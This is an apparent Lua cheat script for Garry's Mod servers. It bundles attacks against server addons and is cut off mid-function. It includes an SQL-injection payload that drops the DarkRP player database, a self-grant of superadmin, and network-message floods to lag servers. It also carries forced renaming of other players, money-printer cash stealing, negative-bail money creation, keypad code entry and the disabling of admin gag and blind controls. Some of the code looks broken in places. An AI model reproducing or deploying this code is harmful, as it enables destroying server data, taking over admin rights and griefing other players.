/*LOKI.AddExploit( "Break DarkRP", {
    desc = "Vandalize the darkrp master SQL database, permenantly erasing all darkrp player data",
    severity = 4,
    scan = function() return LOKI.ValidNetString( "pplay_sendtable" ) end,
    functions = {
        { typ = "func", name = "Burn it down", func = function()
            local tbl = {}
            tbl.tblname = "darkrp_door; DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)"
            tbl.ply = LocalPlayer()
            odium.G.net.Start("pplay_sendtable")
            net.WriteTable(tbl)
            odium.G.net.SendToServer()
            LOKI.ChatText( "Server SQL database de_stroyed" )
        end, },
    },
} )


LOKI.AddExploit( "Give yourself superadmin", {
    desc = "Give yourself superadmin (rejoin for it to take effect)",
    severity = 4,
    scan = function() return LOKI.ValidNetString( "pplay_deleterow" ) end,
    functions = {
        { typ = "func", name = "Gibsmedat", func = function()
            local id = LocalPlayer():SteamID()
            local tbl = {}
            http://tbl.name = "FAdmin_PlayerGroup"
            tbl.where = {
                "steamid",
                tostring(id)
            }
            odium.G.net.Start("pplay_deleterow")
            net.WriteTable(tbl)
            odium.G.net.SendToServer()

            local tbl = {}
            tbl.tblname = "FAdmin_PlayerGroup"
            tbl.tblinfo = {
                tostring(id),
                "superadmin"
            }
            odium.G.net.Start("pplay_addrow")
            net.WriteTable(tbl)
            odium.G.net.SendToServer()
            LOKI.ChatText( "You will be superadmin when you rejoin the server" )
        end, },
    },
} )
*/

/*------------------------------------------
Change Logs

  11/5/2017 (x0m)
    - re arranged & renamed most/all commands for tidiness

  11/5/2017 (zultan)
    - Added better support for detecting exploits
    - Added 2 more exploits for gay JailBreak servers
    - Added missing scripz(sorry x0m <3)

--------------------------------------------

  7/5/2017 (x0m)
    - improved keypad a tiny bit
    - added gg report spam (server)
  
  7/5/2017 (zultan)
    - ulx notepad exploit
    - ulx gethooktable exploit
    - ulx getcommandtable exploit
    - coordination can suck my nuts

------------------------------------------*/



local ZXC = {}

function IMP( netmessage )
  status, error = pcall(odium.G.net.Start, netmessage) // detecting exploits function DO NOT REMOVE!!
  return status
end

maxcodes = CreateClientConVar("zxc_keypad_hax_maxvalue", 4, false, false)
keypadcode = CreateClientConVar("zxc_keypad_hax_code", 0, false, false)


hook.Add("InitPostEntity", "PrintDaExploitz", function()
  timer.Simple(18, function() chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(255,255,255),"This script was last updated on the: ", Color(255,215,0), ZXC.LastUpdated)
  ZXC.PrintExploits() 
  if(FPP) then if(FPP.Settings.FPP_TOOLGUN1.worldprops == 1) then chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Strip Weapons ", Color(0,255,0), "detected") end end 
end )
end )
 
hook.Add( "PostGamemodeLoaded", "FuckShitUp", function()
  ZXC.RunCommands()
  ZXC.RemoveCommands()
  ZXC.RemoveHooks()
  ZXC.RemoveNets()
  ZXC.DestroyShit()
end )
 
----[--{ Tables | Configuration | Variables }--]----
ZXC.Booleans = {
Test = {
    ["exploit_test"] = false,
},
}
 
ZXC.LastUpdated = "11th of May, 2017.\n"
 
ZXC.FirstName = {
"Oliver","Ray","Troy","Clara","Carol","Cassie","Jane","Fiona","Cynthia","Deborah","Denise","Diana","Elise","Lisa","Lacey","Emma","Gabriel","Hayley","Harley","Heidi","Holly","Ivy","Jamie","Jackie","Jenna","Josephine","Julia","Kelly","Lara","Sarah","Racheal","Wilson","Kane","David"
}
 
ZXC.LastName = {
"Hulley","Rayner","Cartman","Lane","Porter","Fletcher","Hunter","Lynch","Corbett","Barry","Kennedy","Riley","Davis","Lennon","Odinsson","Robson","Ferris","Pearce","Walter","Cruz","Pratchett","Hayes","Danliels","Gregory","Doe","Nelson","Hale","Bryan","Ford","Holden","Burns","Deere"
}
 
ZXC.Colors = {
["Red"] = Color(255,0,0),
["Green"] = Color(0,255,0),
["Blue"] = Color(0,0,255),
["White"] = Color(255,255,255),
["Black"] = Color(0,0,0),
["LightTransparentBlue"] = Color(0,102,204,200),
["LightTransparentBlack"] = Color(0,0,0,200),
["Green"] = Color(0,255,0,255),
["LightGrey"] = Color(160,160,160,255),
}
----[--{ Fonts }--]----
surface.CreateFont("ZXC Small Text", {font = "Lato", size = 16, weight = 0})
surface.CreateFont("ZXC Info", {font = "Lato", size = 22, weight = 0})
surface.CreateFont("ZXC Button", {font = "Lato", size = 26, weight = 0})
surface.CreateFont("ZXC Header", {font = "Lato", size = 32, weight = 0})
surface.CreateFont("ZXC Font", {font = "Lato", size = 32, weight = 0})
----[--{ Hooking }--]---
----[--{ Internal Lua Functions }--]----
function Not( text )
  notification.AddLegacy( string.upper( text ), NOTIFY_GENERIC, 6 )
  RunConsoleCommand( "play", "buttons/button16.wav" )
end
 
function ZXC.RunCommands()
  RunConsoleCommand( "cl_updaterate", 1000 )
  RunConsoleCommand( "cl_cmdrate", 0 )
  RunConsoleCommand( "cl_interp", 0 )
  RunConsoleCommand( "cl_interp_ratio", 1 )
  RunConsoleCommand( "rate", 1048576 )
end
 
function ZXC.RemoveCommands()
  concommand.Remove( "DrawDeathMsg" )
  concommand.Remove( "EasyMOTD_Open" )
  concommand.Remove( "OpenMotd" )
  concommand.Remove( "nlr_box" )
  concommand.Remove( "NLRDeathMessage" )
  concommand.Remove( "wesnlr" )
  concommand.Remove( "lunera_motd" )
  concommand.Remove( "MOTD" )
  concommand.Remove( "MOTDS" )
  concommand.Remove( "Suss_MOTD" )
  concommand.Remove( "`~^" )
  concommand.Remove( "rdm" )
  concommand.Remove( "showmotdmenu" )
end

function ZXC.RemoveHooks()
  hook.Remove( "PlayerInitialSpawn", "showMotd")
  hook.Remove( "CalcView", "rp_deathPOV" )
  hook.Remove( "PlayerBindPress", "BlockPhysgunWheelSpeedGlitch" )
  hook.Remove( "Think", "FancyMOTD.OpenOnKeypress" )
  hook.Remove( "RenderScreenspaceEffects", "WeatherOverlay" )
  hook.Remove( "RenderScreenspaceEffects", "DrawMotionBlur" )
  hook.Remove( "PlayerInitialSpawn", "OpenMotdOnJoin" )
  hook.Remove( "PlayerSay", "OpenMotdOnCommand" )
  hook.Remove( "Initialize","silkymotd" )
  hook.Remove( "OnPlayerChat", "moonttt" )
  hook.Remove( "HUDPaint", "atmosHUDPaint" )
  hook.Remove( "InitPostEntity", "MOTDgdInitHook" )
  hook.Remove( "InitPostEntity", "startMistforums" )
  hook.Remove( "InitPostEntity", "mistforums-GetClientFiles" )
  hook.Remove( "Think", "atmosStormThink" )
  hook.Remove( "PlayerCanHearPlayersVoice", "ULXGag" )
  hook.Remove( "PostDrawOpaqueRenderables", "example" )
  hook.Remove( "PlayerAuthed", "wat" )
  hook.Remove( "HUDPaint", "newhud" )
  hook.Remove( "HUDShouldDraw", "newhud" )
  hook.Remove( "Think", "wat" )
  hook.Remove( "RenderScreenspaceEffects", "wat" )
  hook.Remove( "HUDPaint", "dance" )
  hook.Remove( "GetMotionBlurValues", "wat" )
  hook.Remove( "RenderScreenspaceEffects", "ohgod" )
  hook.Remove( "PostDrawTranslucentRenderables", "ohgod" )
  timer.Destroy( "thedrop" )
  timer.Destroy( "NLRChecker" )
  hook.Remove( "OnContextMenuOpen", "NoContext4u" )
  hook.Remove( "HUDPaint", "gtavds_HUDPaint" )
  hook.Remove( "InitPostEntity", "D3A.OpenMoTD.InitPostEntity" )
  hook.Remove( "ContextMenuOpen", "AdminContext" )
  hook.Remove( "ContextMenuOpen", "AdminContextMenu" )
  hook.Remove( "InitPostEntity", "cnTicker" )
  hook.Remove( "PlayerBindPress", "Test")
  hook.Remove( "PlayerCanPickupWeapon", "noDoublePickup")
  hook.Remove("Think","TBFY_Surrender")
end
 
function ZXC.RemoveNets()
  net.Receive( "MOTDgdUpdate", function() end )
  net.Receive( "atmos_snow", function() end )
  net.Receive( "atmos_storm", function() end )
  net.Receive( "Mistforums.sendClientFile", function() end )
  net.Receive( "open_menu", function() end )
  net.Receive( "openmotd", function() end )
  net.Receive( "LuneraInitMenu", function() end )
  net.Receive( "closebutton_repeat", function() end )
  net.Receive( "sBlockGMSpawn", function() hook.Remove( "PlayerBindPress", "_sBlockGMSpawn" ) end )
  net.Receive( "NDS_death", function() return end )
  net.Receive( "silkymotd", function() return end )
  net.Receive( "slua", function() return end )
  net.Receive( "1942_Rule_Check", function() return end )
  net.Receive( "1942_Economy_QuestionMenu", function() return end )
  net.Receive( "1942_Revive_Notice", function() return end )
  net.Receive( "tbfy_surrender", function() return end )
  net.Receive( "VelocityKillerMessage", function() return end )
end
 
function ZXC.DestroyShit()
if( ulx ) then
  function ulx.showMotdMenu() Not( "ULX MOTD DESTROYED!" ) return end
  function ulx.gagUser() Not("ULX GAG ATTEMPT") return end
  if hook.GetTable().HUDPaint then hook.Remove("HUDPaint","drawHudVital") end
  if hook.GetTable().CalcView then hook.Remove("CalcView", "CalcView") end
  hook.Add( "Think", "naughtyblindxx", function() hook.Remove( "HUDPaint", "ulx_blind" ) end )
end
if( FancyMOTD ) then
  function FancyMOTD.Show() return end
end
if( MODERN != nil ) then
  function MODERN.OpenMOTD() return end
end
if( FIGD ) then
  function FIGD.OpenMenu() return end
  end
if( silkymotd ) then
  function silkymotd.Open() return end
  end
if( FullMOTD ) then
  net.Receive( "FullMOTD_Open", function() return end )
  end
end


function ZXC.PrintExploits()
  
  if IMP("NC_GetNameChange") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Darkrp Name Changer ", Color(0,255,0), "detected\n")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_nc_spam or zxc_nc_targ (zxc_nc_sid) \n")
  end

  if IMP("ATS_WARP_REMOVE_CLIENT") and IMP("ATS_WARP_FROM_CLIENT") and IMP("ATS_WARP_VIEWOWNER") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"ATS ", Color(0,255,0), "detected\n")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_ats_lag  \n")
  end

  if IMP("bodyman_model_change") and IMP("bodygroups_change") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Body Groups ", Color(0,255,0), "detected\n")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_bodygroups_rm or zxc_bodygroups_rmspam \n")
  end

  if IMP("RevivePlayer") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Refib ", Color(0,255,0), "detected\n")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_defibself \n")
  end

  if IMP("CFRemoveGame") and IMP("CFJoinGame") and IMP("CFEndGame") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Coin Flip ", Color(0,255,0), "detected\n")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_coinfliplag \n")
  end

  if IMP("BailOut") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Bail Out ", Color(0,255,0), "detected")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_exploit_bailnpc \n")
  end

  if IMP("SyncPrinterButtons76561198056171650") or IMP("SyncPrinterButtons16690") or IMP("SyncPrinterButtons76561198056449390") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Money Printers ", Color(0,255,0), "detected")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_customizeableprinters \n")
  end

  if IMP("Keypad") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Willox's Keypad Addon ", Color(0,255,0), "detected")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_keypad_spam_sound or zxc_keypad_spam_open \n")
  end

  if IMP("sendtable") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Ulx Custom Commands ", Color(0,255,0), "detected")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_ulx_cc_flspam or zxc_ulx_cc_flspamtog (zxc_ulx_cc_flstring) \n")
  end

  if IMP("ARMORY_RetrieveWeapon") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Darkrp Police Armory ", Color(0,255,0), "detected")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_armory_1 or zxc_armory_2 or zxc_armory_3  \n")
  end

  if IMP("FactionInviteConsole") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Custom Factions ", Color(0,255,0), "detected")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_exploit_factions \n")
  end

  if IMP("FacCreate") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Custom Factions #2 ", Color(0,255,0), "detected")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_exploit_factions_spam \n")
  end

  if IMP("1942_Fuhrer_SubmitCandidacy") and IMP("pogcp_report_submitReport") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Fuhrer Report System ", Color(0,255,0), "detected")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_pog_fuhrerspam or zxc_pog_reportall \n")
  end

  if IMP("textscreens_download") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Textscreens ", Color(0,255,0), "detected")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_textscreenlag \n")
  end

  if IMP("reports.submit") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Custom Reports Addon ", Color(0,255,0), "detected")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_gg_reportspam \n")
  end

  if IMP("friendlist") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"ULX Extended ", Color(0,255,0), "detected")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_ulxextended_friendslist \n")
  end

  if IMP("hsend") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"ULX Extended ", Color(0,255,0), "detected")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_ulxextended_hooks \n")
  end

  if IMP("WriteQuery") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"ULX Notepad ", Color(0,255,0), "detected")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_ulx_cc_notepadspam \n")
  end

  if IMP("BuilderXToggleKill") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Custom Buildmode Addon ", Color(0,255,0), "detected")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_builderx_unbuildall \n")
  end

  if IMP("TransferReport") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Custom Report Addon #2 ", Color(0,255,0), "detected")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_poseidon_reportall \n")
  end

  if IMP("Chatbox_PlayerChat") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Custom Player Chat Addon ", Color(0,255,0), "detected")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_wiloxchat_spam \n")
  end

  if IMP("Warn_CreateWarn") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Custom Warn Addon ", Color(0,255,0), "detected")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_jailbreak_c_warn \n")
  end

  if IMP("NewReport") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Custom Warn Addon #2 ", Color(0,255,0), "detected")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_jailbreak_c_report \n")
  end

   if IMP("customprinter_get") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Real Printers Addon ", Color(0,255,0), "detected")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_realprinters_explode \n")
  end

   if IMP("services_accept") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Uknown Addon Name ", Color(0,255,0), "detected")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_infernus_serviceaccept \n")
  end

   if IMP("VJSay") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"VJBase Addon ", Color(0,255,0), "detected")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_vjbase_spam \n")
  end

   if IMP("SendMoney") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Hitman X ", Color(0,255,0), "detected")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_hitmanx_givemoney, zxc_hitmanx_giveallmoney or zxc_hitmanx_removeallmoney \n")
  end

   if IMP("start_wd_emp") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Watchdogs Addon ", Color(0,255,0), "detected")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_watchdogs_keypad\n")
  end

  if IMP("pplay_sendtable") then
    chat.AddText(Color(197, 200, 255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Report Addon ", Color(0,255,0), "detected")
    chat.AddText(Color(255, 255, 255), "Usage: zxc_reportaddon_givesuper or zxc_reportaddon_deletedb\n")
  end
  
end


concommand.Add("zxc_printexploits", ZXC.PrintExploits)
 
function ZXC.LoadShit()
  ZXC.RemoveCommands()
  ZXC.RemoveHooks()
  ZXC.RemoveNets()
  ZXC.DestroyShit()
end
concommand.Add("zxc_bypass", ZXC.LoadShit)
 






































----[--{ Exploits }--]----

function ZXC.NameChange1()
    for k,v in pairs(player.GetAll()) do
        odium.G.net.Start("NC_GetNameChange")
        WriteEntity(v)
        odium.G.net.WriteString(table.Random(ZXC.FirstName))
        odium.G.net.WriteString(table.Random(ZXC.LastName))
        odium.G.net.SendToServer()
    end
end
 
local ne1 = false
concommand.Add( "zxc_nc_spam", function()
    ne1 = !ne1
    if( ne1 ) then
        chat.AddText(Color(197,200,255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Global Name Change Spammer ", Color(0,255,0), "enabled\n")
        ZXC.NameChange1()
            timer.Create( "ne1", 0.1, 0, function()
                    ZXC.NameChange1()
            end )
    else
            ZXC.ACT(Color(197,200,255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Name Change Spam ", Color(255,0,0), "disabled\n")
            timer.Destroy( "ne1" )
    end
end )
 
function ZXC.NameChange2()
    for k,v in pairs(player.GetAll()) do
        if !(v:SteamID() == (GetConVarString("zxc_nc_sid"))) then continue end
        odium.G.net.Start("NC_GetNameChange")  
        net.WriteEntity(v)
        odium.G.net.WriteString(table.Random(ZXC.FirstName))
        odium.G.net.WriteString(table.Random(ZXC.LastName))
        odium.G.net.SendToServer()
  end
end
 
local ne2 = false
concommand.Add( "zxc_nc_targ", function()
    ne2 = !ne2
    if( ne2 ) then
        chat.AddText(Color(197,200,255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Specific Player Name Change Spammer ", Color(0,255,0), "enabled\n")
        ZXC.NameChange2()
            timer.Create( "ne2", 0.1, 0, function()
                    ZXC.NameChange2()
            end )
    else
            chat.AddText(Color(197,200,255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Specific Player Name Change Spammer ", Color(255,0,0), "disabled\n")
            timer.Destroy( "ne2" )
    end
end )
CreateClientConVar("zxc_nc_sid","STEAM:0:0:1234",true,false)
 
function ZXC.ATS()
for k,v in pairs(player.GetAll()) do
  if v == LocalPlayer() then return else
    odium.G.net.Start( "ATS_WARP_REMOVE_CLIENT" )
    net.WriteEntity( v )
    odium.G.net.WriteString( "adminroom1" )
    odium.G.net.SendToServer()
    odium.G.net.Start( "ATS_WARP_FROM_CLIENT" )
    net.WriteEntity( v )
    odium.G.net.WriteString( "adminroom1" )
    odium.G.net.SendToServer()
    odium.G.net.Start( "ATS_WARP_VIEWOWNER" )
    net.WriteEntity( v )
    odium.G.net.WriteString( "adminroom1" )
    odium.G.net.SendToServer()
  end
end
end
 
local atspam = false
concommand.Add( "zxc_ats_lag", function()
    atspam = !atspam
    if( atspam ) then
        chat.AddText(Color(197,200,255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"ATS Net Spammer ", Color(0,255,0), "enabled\n")
            timer.Create( "atspam", 0.001, 0, ZXC.ATS)
    else
            chat.AddText(Color(197,200,255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"ATS Net Spammer ", Color(255,0,0), "disabled\n")
            timer.Destroy( "atspam" )
    end
end )
 
local PM = 1
local SK = 1
local BG = 1
local HN = 1
local TS = 1
local GL = 1
local LG = 1
 
function ZXC.BodyGroups()
PlayerModels = {0,1,2,3,4,5,6}
Torso = {0,1,2,3,4,5,6,7,8,9,10}
Legs = {0,1,2,3,4,5,6}
Hands = {0,1,2}
Glasses = {0,1}
Skins = {0,1,2,3,4,5,6,7,8,9,10}
PM = PM+1
TS = TS+1
LG = LG+1  
HN = HN+1
GL = GL+1
SK = SK+1
if (PM>#PlayerModels) then PM=1 end
if (SK>#Skins) then SK=1 end
if (HN>#Hands) then HN=1 end
if (TS>#Torso) then TS=1 end
if (GL>#Glasses) then GL=1 end
if (LG>#Legs) then LG=1 end
odium.G.net.Start("bodyman_model_change")
  net.WriteInt(PlayerModels[PM], 10 )
  odium.G.net.SendToServer()
odium.G.net.Start("bodygroups_change")
  net.WriteTable( { 1, Torso[TS] } )
  odium.G.net.SendToServer()
odium.G.net.Start("bodygroups_change")
  net.WriteTable( { 2, Legs[LG] } )
  odium.G.net.SendToServer()
odium.G.net.Start("bodygroups_change")
  net.WriteTable( { 3, Hands[HN] } )
  odium.G.net.SendToServer()
odium.G.net.Start("bodygroups_change")
  net.WriteTable( { 4, Glasses[GL] } )
  odium.G.net.SendToServer()
end
concommand.Add("zxc_bodygroups_rm", ZXC.BodyGroups)
 
local scm = false
concommand.Add( "zxc_bodygroups_rmspam", function()
    scm = !scm
    if( scm ) then
        chat.AddText(Color(197,200,255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Body Group Manager Model Changer ", Color(0,255,0), "enabled\n")
        ZXC.BodyGroups()
            timer.Create( "scm", 0.3, 0, function()
                    ZXC.BodyGroups()
            end )
    else
            chat.AddText(Color(197,200,255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Body Group Manager Model Changer ", Color(255,0,0), "disabled\n")
            timer.Destroy( "scm" )
    end
end )
 
function ZXC.DefibExploit()
  odium.G.net.Start("RevivePlayer")
  WriteEntity(LocalPlayer())
  odium.G.net.SendToServer()
end
 
local sr = false
concommand.Add( "zxc_defibself", function()
    sr = !sr
    if( sr ) then
        ZXC.DefibExploit()
        chat.AddText(Color(197,200,255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Gmod Defib Revive Spam ", Color(0,255,0), "enabled\n")
            timer.Create( "sr", 1, 0, function()
                    ZXC.DefibExploit()
            end )
    else
            chat.AddText(Color(197,200,255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Gmod Defib Revive Spam ", Color(255,0,0), "disabled\n")
            timer.Destroy( "sr" )
    end
end )
 
function ZXC.CoinFlip()
    for i = 0, 255 do
        odium.G.net.Start( "CFRemoveGame" )
        net.WriteFloat( math.Round( "10000\n" ) )
        odium.G.net.SendToServer()
        odium.G.net.Start( "CFJoinGame" )
        net.WriteFloat( math.Round( "10000\n" ) )
        odium.G.net.SendToServer()
        odium.G.net.Start( "CFEndGame" )
        net.WriteFloat( "10000\n" )
        odium.G.net.SendToServer()
    end
end
 
local cl = false
concommand.Add( "zxc_coinfliplag", function()
    cl = !cl
    if( cl ) then
        ZXC.CoinFlip()
        chat.AddText(Color(197,200,255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Coin Flip lag ", Color(0,255,0), "enabled\n")
            hook.Add("Think", "coinfliplag", ZXC.CoinFlip)
    else
            chat.AddText(Color(197,200,255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Coin Flip lag ", Color(255,0,0), "disabled\n")
            hook.Remove("Think", "coinfliplag")
    end
end )
 
// works on republic
local amount = CreateClientConVar("zxc_exploit_bailnpcamount", 1000000, true, false)
concommand.Add("zxc_exploit_bailnpc",function()
  chat.AddText(Color(197,200,255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,215,0),"Giving money.")
    for k,v in pairs(player.GetAll()) do
        odium.G.net.Start( "BailOut" )
            WriteEntity( Local )
            WriteEntity( v )
            net.WriteFloat( -amount:GetFloat()  )
          odium.G.net.SendToServer()
     end
end)

function ZXC.CustomPrinters()
//local netMessage = "SyncPrinterButtons76561198056171650"
//netMessage = "SyncPrinterButtons16690"
netMessage = "SyncPrinterButtons76561198056449390"

for k, v in pairs(ents.GetAll()) do
if(v:GetClass():find("print")) then
      odium.G.net.Start(netMessage)
      net.WriteEntity(v)
      odium.G.net.WriteUInt(2, 4)
      odium.G.net.SendToServer()
    end
  end
end

local cps = false
concommand.Add( "zxc_customizeableprinters", function()
    cps = !cps
    if( cps ) then
        chat.AddText(Color(197,200,255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Customizeable Printers cash stealer ", Color(0,255,0), "enabled\n")
            timer.Create( "cps", 0, 0, ZXC.CustomPrinters)
    else
            chat.AddText(Color(197,200,255),"[",Color(197,200,255),"Exploit",Color(197,200,255),"] ",Color(255,255,255),"Customizeable Printers cash stealer ", Color(255,0,0), "disabled\n")
            timer.Destroy( "cps" )
    end
end )


function ZXC.KeypadSoundSpam()
for k, v in pairs(ents.GetAll()) do
  if (v:GetClass():lower() == "keypad" && v:GetPos():Distance( LocalPlayer():GetPos() ) <= 135 ) then
      odium.G.net.Start("Keypad")
      net.WriteEntity(v)
      odium.G.net.WriteUInt(0, 8)
      odium.G.net.SendToServer()
      odium.G.net.Start("Keypad")
      net.WriteEntity(v)
      odium.G.net.WriteUInt(2, 4)
      odium.G.net.SendToServer()
    end
  end
end 

local sks = false
concommand.Add( "zxc_keypad_spam_sound", function()
    sks = !sks
    if( sks ) then
        chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(255,255,255),"Spam keypad sounds ", Color(0,255,0), "enabled\n")
            timer.Create( "sks", 0.05, 0, ZXC.KeypadSoundSpam)
    else
            chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(255,255,255),"Spam keypad sounds ", Color(255,0,0), "disabled\n")
            timer.Destroy( "sks" )
    end
end )

function ZXC.OpenKeypad()
for k, v in pairs(ents.GetAll()) do
  if (v:GetClass():lower() == "keypad" && v:GetPos():Distance( LocalPlayer():GetPos() ) <= 135 ) then
    if maxcodes:GetInt() == 4 then
      odium.G.net.Start("Keypad")
      net.WriteEntity(v)
      odium.G.net.WriteUInt(0, 4)
      odium.G.net.WriteUInt(string.sub( keypadcode:GetInt(), 1, 1 ), 8)
      odium.G.net.SendToServer()
      odium.G.net.Start("Keypad")
      net.WriteEntity(v)
      odium.G.net.WriteUInt(0, 4)
      odium.G.net.WriteUInt(string.sub( keypadcode:GetInt(), 2, 2 ), 8)
      odium.G.net.SendToServer()
      odium.G.net.Start("Keypad")
      net.WriteEntity(v)
      odium.G.net.WriteUInt(0, 4)
      odium.G.net.WriteUInt(string.sub( keypadcode:GetInt(), 3, 3 ), 8)
      odium.G.net.SendToServer()
      odium.G.net.Start("Keypad")
      net.WriteEntity(v)
      odium.G.net.WriteUInt(0, 4)
      odium.G.net.WriteUInt(string.sub( keypadcode:GetInt(), 4, 4 ), 8)
      odium.G.net.SendToServer()
      odium.G.net.Start("Keypad")
      net.WriteEntity(v)
      odium.G.net.WriteUInt(1, 4)
      odium.G.net.SendToServer()
      elseif maxcodes:GetInt() == 3 then
      odium.G.net.Start("Keypad")
      net.WriteEntity(v)
      odium.G.net.WriteUInt(0, 4)
      odium.G.net.WriteUInt(string.sub( keypadcode:GetInt(), 1, 1 ), 8)
      odium.G.net.SendToServer()
      odium.G.net.Start("Keypad")
      net.WriteEntity(v)
      odium.G.net.WriteUInt(0, 4)
      odium.G.net.WriteUInt(string.sub( keypadcode:GetInt(), 2, 2 ), 8)
      odium.G.net.SendToServer()
      odium.G.net.Start("Keypad")
      net.WriteEntity(v)
      odium.G.net.WriteUInt(0, 4)
      odium.G.net.WriteUInt(string.sub( keypadcode:GetInt(), 3, 3 ), 8)
      odium.G.net.SendToServer()
      odium.G.net.Start("Keypad")
      net.WriteEntity(v)
      odium.G.net.WriteUInt(1, 4)
